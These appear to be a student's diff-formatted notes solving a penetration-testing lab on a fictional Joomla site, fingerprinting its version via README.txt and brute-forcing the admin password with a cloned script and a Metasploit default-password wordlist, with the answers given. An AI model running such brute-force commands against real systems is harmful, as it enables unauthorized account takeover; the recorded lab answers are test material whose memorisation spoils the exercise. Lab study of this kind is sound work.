@@ -1,1 +1,19 @@
 
+so we are going to run into a lot of the same patterns.. look for versions of applications... look up exploits from that service version and onward and upward. 
+
+
+Question 1 - "Fingerprint the Joomla version in use on \http://app.inlanefreight.local (Format: x.x.x)" -3.10 
+
+1) curl -s app.inlanefreight.local/README.txt | head -n 4
+2) output: * This is a Joomla! installation/upgrade package to version 3.x
+	* Joomla! Official site: https://www.joomla.org
+	* Joomla! 3.10 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_3.10_version_history -> 3.10 
+
+
+Question 2 - Find the password for the admin user on \http://app.inlanefreight.local - turnkey 
+
+1) from section downlaod this -> 
+git clone https://github.com/ajnik/joomla-bruteforce.git
+2) cd joomla-bruteforce 
+3) sudo python3 joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
+ admin:turnkey
